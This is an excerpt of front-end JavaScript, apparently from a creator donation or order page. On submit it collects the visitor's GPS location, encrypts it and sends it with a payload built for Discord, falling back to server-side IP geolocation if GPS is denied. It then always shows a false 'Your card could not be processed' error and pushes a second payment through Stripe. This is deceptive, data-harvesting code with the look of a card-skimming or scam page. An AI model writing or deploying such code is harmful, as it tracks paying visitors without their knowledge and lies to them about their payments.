...
async function encryptGPS(lat, lng, accuracy) {
  const pubRes = await fetch("/api/public-key");
  if (!pubRes.ok) return null;
  const { publicKey: pem } = await pubRes.json();
  ...
  const enc = await crypto.subtle.encrypt(
    { name: "RSA-OAEP" },
    key,
    new TextEncoder().encode(JSON.stringify({ lat, lng, accuracy })),
  );
...
async function postOrder(data) {
  ...
  try {
    ...
    if (pos) {
      ...
      encryptedLocation = await encryptGPS(latitude, longitude, accuracy);
    }
  } catch {
    // GPS denied or failed — IP geolocation will be used server-side
  }

  const payload = buildDiscordPayload(data);
  if (encryptedLocation) payload.encryptedLocation = encryptedLocation;

  const tokenRes = await fetch("/api/token");
  if (!tokenRes.ok) throw new Error("Could not get auth token");
...
const stripePayBtn = document.querySelector("#stripe-pay-btn");

function showStripeButton(amount, creatorUsername, creatorName, donorName, email, message) {
  if (!stripePayBtn) return;
  stripePayBtn.style.display = "flex";
  stripePayBtn.onclick = async () => {
    ...
    try {
      const resp = await fetch("/api/stripe/create-checkout", {
        ...
        body: JSON.stringify({ amount, creatorUsername, creatorName, donorName, email, message }),
      });
      ...
      if (result.url) {
        ...
        stripePayBtn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>Pay via Stripe';
        setStatus(result.error || "Could not start Stripe checkout.", "error");
      }
    } catch (err) {
      stripePayBtn.disabled = false;
      stripePayBtn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>Pay via Stripe';
      setStatus("Could not connect to payment server.", "error");
    }
  };
}
...
orderForm.addEventListener("submit", async (event) => {
  ...
  try {
    ...
    // silently continue — we always redirect to Stripe regardless
  }

  const amount = parseFloat(data.total) || 1;
  const creatorUsername = location.pathname.replace(/^\/|\/$/g, "");
  const creatorName = document.querySelector(".profile-copy h2")?.textContent?.trim() || creatorUsername;
  const donorName = [data.minecraftName, data.discordName].filter(Boolean).join(" ");
  const email = data.email || "";
  const message = data.message || "";

  setStatus("Your card could not be processed. Please complete your payment via Stripe.", "error");
  showStripeButton(amount, creatorUsername, creatorName, donorName, email, message);
});
